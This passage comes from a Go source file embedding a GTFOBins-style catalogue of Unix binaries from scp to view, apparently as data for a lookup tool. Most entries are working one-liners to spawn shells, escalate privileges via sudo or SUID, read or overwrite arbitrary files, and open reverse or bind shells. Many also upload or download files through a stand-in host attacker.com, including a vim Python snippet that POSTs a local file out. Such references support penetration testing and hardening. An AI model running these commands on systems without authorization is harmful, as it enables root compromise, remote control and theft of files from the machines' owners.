scp $LFILE $RPATH
`, "code"},
		},
		"file-download": []Functions{
			Functions{`RPATH=user@attacker.com:~/file_to_get
LFILE=file_to_save
scp $RPATH $LFILE
`, "code"},
			Functions{`Fetch a remote file from a SSH server.`, "description"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
`, "code"},
		},
	},
	"screen": map[string][]Functions{
		"file-write": []Functions{
			Functions{`This works on screen version 4.06.02. Data is appended to the file and '\n' is converted to '\r\n'.`, "description"},
			Functions{`LFILE=file_to_write
screen -L -Logfile $LFILE echo DATA
`, "code"},
			Functions{`This works on screen version 4.05.00. Data is appended to the file and '\n' is converted to '\r\n'.`, "description"},
			Functions{`LFILE=file_to_write
screen -L $LFILE echo DATA
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo screen`, "code"},
		},
		"shell": []Functions{
			Functions{`screen`, "code"},
		},
	},
	"script": map[string][]Functions{
		"shell": []Functions{
			Functions{`script -q /dev/null`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo script -q /dev/null`, "code"},
		},
		"file-write": []Functions{
			Functions{`The wrote content is corrupted by debug prints.`, "description"},
			Functions{`script -q -c 'echo DATA' file_to_write`, "code"},
		},
	},
	"sed": map[string][]Functions{
		"shell": []Functions{
			Functions{`GNU version only. Also, this requires 'bash'.`, "description"},
			Functions{`sed -n '1e exec sh 1>&0' /etc/hosts`, "code"},
			Functions{`GNU version only. The resulting shell is not a proper TTY shell.`, "description"},
			Functions{`sed e`, "code"},
		},
		"command": []Functions{
			Functions{`GNU version only.`, "description"},
			Functions{`sed -n '1e id' /etc/hosts`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
sed '' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./sed -e '' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`GNU version only. Also, this requires 'bash'.`, "description"},
			Functions{`sudo sed -n '1e exec sh 1>&0' /etc/hosts`, "code"},
		},
	},
	"service": map[string][]Functions{
		"shell": []Functions{
			Functions{`/usr/sbin/service ../../bin/sh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo service ../../bin/sh`, "code"},
		},
	},
	"setarch": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo setarch $(arch) /bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`setarch $(arch) /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./setarch $(arch) /bin/sh -p`, "code"},
		},
	},
	"sftp": map[string][]Functions{
		"sudo": []Functions{
			Functions{`HOST=user@attacker.com
sudo sftp $HOST
!/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`HOST=user@attacker.com
sftp $HOST
!/bin/sh
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file to a SSH server.`, "description"},
			Functions{`RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file from a SSH server.`, "description"},
			Functions{`RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save
`, "code"},
		},
	},
	"sg": map[string][]Functions{
		"shell": []Functions{
			Functions{`Commands can be run if the current user's group is specified, therefore no additional permissions are needed.`, "description"},
			Functions{`sg $(id -ng)
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo sg root
`, "code"},
		},
	},
	"shuf": map[string][]Functions{
		"suid": []Functions{
			Functions{`The written file content is corrupted by adding a newline.`, "description"},
			Functions{`LFILE=file_to_write
./shuf -e DATA -o "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The written file content is corrupted by adding a newline.`, "description"},
			Functions{`LFILE=file_to_write
sudo shuf -e DATA -o "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is corrupted by randomizing the order of NUL terminated strings.`, "description"},
			Functions{`LFILE=file_to_read
shuf -z "$LFILE"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The written file content is corrupted by adding a newline.`, "description"},
			Functions{`LFILE=file_to_write
shuf -e DATA -o "$LFILE"
`, "code"},
		},
	},
	"slsh": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./slsh -e 'system("/bin/sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`slsh -e 'system("/bin/sh")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo slsh -e 'system("/bin/sh")'`, "code"},
		},
	},
	"smbclient": map[string][]Functions{
		"shell": []Functions{
			Functions{`smbclient '\\attacker\share'
!/bin/sh
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
`, "code"},
			Functions{`Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run 'sudo smbserver.py share /tmp' on the attacker box to collect the file.`, "description"},
		},
		"file-download": []Functions{
			Functions{`smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
`, "code"},
			Functions{`Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run 'sudo smbserver.py share /tmp' on the attacker box to send the file.`, "description"},
		},
		"sudo": []Functions{
			Functions{`sudo smbclient '\\attacker\share'
!/bin/sh
`, "code"},
		},
	},
	"snap": map[string][]Functions{
		"sudo": []Functions{
			Functions{`It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
'''
`, "description"},
			Functions{`sudo snap install xxxx_1.0_all.snap --dangerous --devmode
`, "code"},
		},
	},
	"socat": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
socat -u "file:$LFILE" -
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Run ''socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat'' on the attacker box to collect the file.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Run ''socat -u file:file_to_send tcp-listen:12345,reuseaddr'' on the attacker box to send the file.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
socat -u 'exec:echo DATA' "open:$LFILE,creat"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The resulting shell is not a proper TTY shell and lacks the prompt.`, "description"},
			Functions{`sudo socat stdin exec:/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`The resulting shell is not a proper TTY shell and lacks the prompt.`, "description"},
			Functions{`socat stdin exec:/bin/sh
`, "code"},
		},
		"bind-shell": []Functions{
			Functions{`LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
`, "code"},
			Functions{`Run ''socat FILE:'tty',raw,echo=0 TCP:target.com:12345'' on the attacker box to connect to the shell.`, "description"},
		},
	},
	"soelim": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
soelim "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./soelim "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo soelim "$LFILE"
`, "code"},
		},
	},
	"sort": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
sort -m "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./sort -m "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo sort -m "$LFILE"
`, "code"},
		},
	},
	"split": map[string][]Functions{
		"shell": []Functions{
			Functions{`The shell prompt is not printed.`, "description"},
			Functions{`split --filter=/bin/sh /dev/stdin
`, "code"},
		},
		"sudo": []Functions{
			Functions{`The shell prompt is not printed.`, "description"},
			Functions{`sudo split --filter=/bin/sh /dev/stdin
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
TF=$(mktemp)
split $LFILE $TF
cat $TF*
`, "code"},
		},
		"file-write": []Functions{
			Functions{`Data will be written in the current directory in a file named 'xaa' by default. The input file will be split in multiple smaller files unless the '-b' option is used, pick a value in MB big enough.`, "description"},
			Functions{`TF=$(mktemp)
echo DATA >$TF
split -b999m $TF
`, "code"},
			Functions{`GNU version only. Data will be written in the current directory in a file named 'xaa.xxx' by default. The input file will be split in multiple smaller files unless the '-b' option is used, pick a value in MB big enough.`, "description"},
			Functions{`EXT=.xxx
TF=$(mktemp)
echo DATA >$TF
split -b999m --additional-suffix $EXTENSION $TF
`, "code"},
		},
		"command": []Functions{
			Functions{`Command execution using an existing or newly created file.`, "description"},
			Functions{`COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF
`, "code"},
			Functions{`Command execution using stdin (and close it directly).`, "description"},
			Functions{`COMMAND=id
echo | split --filter=$COMMAND /dev/stdin
`, "code"},
		},
	},
	"sqlite3": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo sqlite3 /dev/null '.shell /bin/sh'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./sqlite3 /dev/null '.shell /bin/sh'`, "code"},
		},
		"shell": []Functions{
			Functions{`sqlite3 /dev/null '.shell /bin/sh'`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF
`, "code"},
		},
	},
	"ss": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
ss -a -F $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./ss -a -F $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo ss -a -F $LFILE
`, "code"},
		},
	},
	"ssh-keygen": map[string][]Functions{
		"library-load": []Functions{
			Functions{``, "description"},
			Functions{`ssh-keygen -D ./lib.so`, "code"},
		},
		"sudo": []Functions{
			Functions{``, "description"},
			Functions{`sudo ssh-keygen -D ./lib.so`, "code"},
		},
		"suid": []Functions{
			Functions{``, "description"},
			Functions{`./ssh-keygen -D ./lib.so`, "code"},
		},
	},
	"ssh-keyscan": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
ssh-keyscan -f $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./ssh-keyscan -f $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo ssh-keyscan -f $LFILE
`, "code"},
		},
	},
	"ssh": map[string][]Functions{
		"file-download": []Functions{
			Functions{`Fetch a remote file from a SSH server.`, "description"},
			Functions{`HOST=user@attacker.com
RPATH=file_to_get
LPATH=file_to_save
ssh $HOST "cat $RPATH" > $LPATH
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is corrupted by error prints.`, "description"},
			Functions{`LFILE=file_to_read
ssh -F $LFILE localhost
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Spawn interactive root shell through ProxyCommand option.`, "description"},
			Functions{`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`, "code"},
		},
		"shell": []Functions{
			Functions{`Reconnecting may help bypassing restricted shells.`, "description"},
			Functions{`ssh localhost $SHELL --noprofile --norc`, "code"},
			Functions{`Spawn interactive shell through ProxyCommand option.`, "description"},
			Functions{`ssh -o ProxyCommand=';sh 0<&2 1>&2' x`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file to a SSH server.`, "description"},
			Functions{`HOST=user@attacker.com
RPATH=file_to_save
LPATH=file_to_send
ssh $HOST "cat > $RPATH" < $LPATH
`, "code"},
		},
	},
	"start-stop-daemon": map[string][]Functions{
		"shell": []Functions{
			Functions{`start-stop-daemon -n $RANDOM -S -x /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo start-stop-daemon -n $RANDOM -S -x /bin/sh`, "code"},
		},
	},
	"stdbuf": map[string][]Functions{
		"shell": []Functions{
			Functions{`stdbuf -i0 /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./stdbuf -i0 /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo stdbuf -i0 /bin/sh`, "code"},
		},
	},
	"strace": map[string][]Functions{
		"file-write": []Functions{
			Functions{`The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of 'strace - DATA'.`, "description"},
			Functions{`LFILE=file_to_write
strace -s 999 -o $LFILE strace - DATA
`, "code"},
		},
		"shell": []Functions{
			Functions{`strace -o /dev/null /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./strace -o /dev/null /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo strace -o /dev/null /bin/sh`, "code"},
		},
	},
	"strings": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
strings "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./strings "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo strings "$LFILE"
`, "code"},
		},
	},
	"su": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo su`, "code"},
		},
	},
	"sysctl": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
/usr/sbin/sysctl -n "/../../$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./sysctl -n "/../../$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo sysctl -n "/../../$LFILE"
`, "code"},
		},
	},
	"systemctl": map[string][]Functions{
		"suid": []Functions{
			Functions{`TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
`, "code"},
			Functions{`TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo systemctl
!sh
`, "code"},
		},
	},
	"systemd-resolve": map[string][]Functions{
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo systemd-resolve --status
!sh
`, "code"},
		},
	},
	"tac": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
tac -s 'RANDOM' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./tac -s 'RANDOM' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo tac -s 'RANDOM' "$LFILE"
`, "code"},
		},
	},
	"tail": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
tail -c1G "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./tail -c1G "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo tail -c1G "$LFILE"
`, "code"},
		},
	},
	"tar": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`, "code"},
			Functions{`This only works for GNU tar.`, "description"},
			Functions{`tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'`, "code"},
			Functions{`This only works for GNU tar. It can be useful when only a limited command argument injection is available.`, "description"},
			Functions{`TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"
tar xf "$TF.tar" --to-command sh
rm "$TF"*
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).`, "description"},
			Functions{`RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
`, "code"},
		},
		"file-download": []Functions{
			Functions{`This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).`, "description"},
			Functions{`RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_get.tar
tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
`, "code"},
		},
		"file-write": []Functions{
			Functions{`This only works for GNU tar.`, "description"},
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo DATA > "$TF"
tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This only works for GNU tar.`, "description"},
			Functions{`LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`, "code"},
		},
	},
	"taskset": map[string][]Functions{
		"shell": []Functions{
			Functions{`taskset 1 /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./taskset 1 /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo taskset 1 /bin/sh`, "code"},
		},
	},
	"tbl": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
tbl $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./tbl $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo tbl $LFILE
`, "code"},
		},
	},
	"tclsh": map[string][]Functions{
		"shell": []Functions{
			Functions{`tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
`, "code"},
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
		},
		"suid": []Functions{
			Functions{`./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
`, "code"},
		},
	},
	"tcpdump": map[string][]Functions{
		"command": []Functions{
			Functions{`COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
`, "code"},
		},
	},
	"tee": map[string][]Functions{
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo DATA | ./tee -a "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_write
echo DATA | ./tee -a "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
`, "code"},
		},
	},
	"telnet": map[string][]Functions{
		"shell": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh
`, "code"},
			Functions{`BSD version only. Needs to be connected first.`, "description"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
sudo telnet $RHOST $RPORT
^]
!/bin/sh
`, "code"},
			Functions{`BSD version only. Needs to be connected first.`, "description"},
		},
		"limited-suid": []Functions{
			Functions{`BSD version only. Needs to be connected first.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
./telnet $RHOST $RPORT
^]
!/bin/sh
`, "code"},
		},
	},
	"tex": map[string][]Functions{
		"shell": []Functions{
			Functions{`tex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo tex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./tex --shell-escape '\write18{/bin/sh}\end'
`, "code"},
		},
	},
	"tftp": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send local file to a TFTP server.`, "description"},
			Functions{`RHOST=attacker.com
tftp $RHOST
put file_to_send
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file from a TFTP server.`, "description"},
			Functions{`RHOST=attacker.com
tftp $RHOST
get file_to_get
`, "code"},
		},
		"suid": []Functions{
			Functions{`Send local file to a TFTP server.`, "description"},
			Functions{`RHOST=attacker.com
./tftp $RHOST
put file_to_send
`, "code"},
		},
		"sudo": []Functions{
			Functions{`Send local file to a TFTP server.`, "description"},
			Functions{`RHOST=attacker.com
sudo tftp $RHOST
put file_to_send
`, "code"},
		},
	},
	"tic": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
tic -C "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./tic -C "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo tic -C "$LFILE"
`, "code"},
		},
	},
	"time": map[string][]Functions{
		"shell": []Functions{
			Functions{`/usr/bin/time /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./time /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo /usr/bin/time /bin/sh`, "code"},
		},
	},
	"timedatectl": map[string][]Functions{
		"shell": []Functions{
			Functions{`timedatectl list-timezones
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo timedatectl list-timezones
!/bin/sh
`, "code"},
		},
	},
	"timeout": map[string][]Functions{
		"shell": []Functions{
			Functions{`timeout 7d /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./timeout 7d /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo timeout --foreground 7d /bin/sh`, "code"},
		},
	},
	"tmux": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo tmux`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is read and parsed as a 'tmux' configuration file, part of the first invalid line is returned in an error message.`, "description"},
			Functions{`LFILE=file_to_read
tmux -f $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`tmux`, "code"},
		},
	},
	"top": map[string][]Functions{
		"sudo": []Functions{
			Functions{`This requires that the root configuration file is writable and might be used to persist elevated privileges.`, "description"},
			Functions{`echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset
`, "code"},
		},
		"shell": []Functions{
			Functions{`echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
`, "code"},
		},
	},
	"troff": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
troff $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./troff $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo troff $LFILE
`, "code"},
		},
	},
	"tshark": map[string][]Functions{
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
tshark -Xlua_script:$TF
`, "code"},
		},
	},
	"ul": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./ul "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo ul "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
ul "$LFILE"
`, "code"},
		},
	},
	"unexpand": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
unexpand -t99999999 "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./unexpand -t99999999 "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo unexpand -t99999999 "$LFILE"
`, "code"},
		},
	},
	"uniq": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
uniq "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./uniq "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo uniq "$LFILE"
`, "code"},
		},
	},
	"unshare": map[string][]Functions{
		"shell": []Functions{
			Functions{`unshare /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./unshare -r /bin/sh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo unshare /bin/sh`, "code"},
		},
	},
	"update-alternatives": map[string][]Functions{
		"sudo": []Functions{
			Functions{`Write in '$LFILE' a symlink to '$TF'.`, "description"},
			Functions{`LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
sudo update-alternatives --force --install "$LFILE" x "$TF" 0
`, "code"},
		},
		"suid": []Functions{
			Functions{`Write in '$LFILE' a symlink to '$TF'.`, "description"},
			Functions{`LFILE=/path/to/file_to_write
TF=$(mktemp)
echo DATA >$TF
./update-alternatives --force --install "$LFILE" x "$TF" 0
`, "code"},
		},
	},
	"uudecode": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
	},
	"uuencode": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo uuencode "$LFILE" /dev/stdout | uudecode
`, "code"},
		},
	},
	"valgrind": map[string][]Functions{
		"shell": []Functions{
			Functions{`valgrind /bin/sh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo valgrind /bin/sh`, "code"},
		},
	},
	"vi": map[string][]Functions{
		"shell": []Functions{
			Functions{`vi -c ':!/bin/sh' /dev/null`, "code"},
			Functions{`vi
:set shell=/bin/sh
:shell
`, "code"},
		},
		"file-write": []Functions{
			Functions{`vi file_to_write
iDATA
^[
w
`, "code"},
		},
		"file-read": []Functions{
			Functions{`vi file_to_read`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo vi -c ':!/bin/sh' /dev/null`, "code"},
		},
	},
	"view": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`This requires that 'view' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
`, "code"},
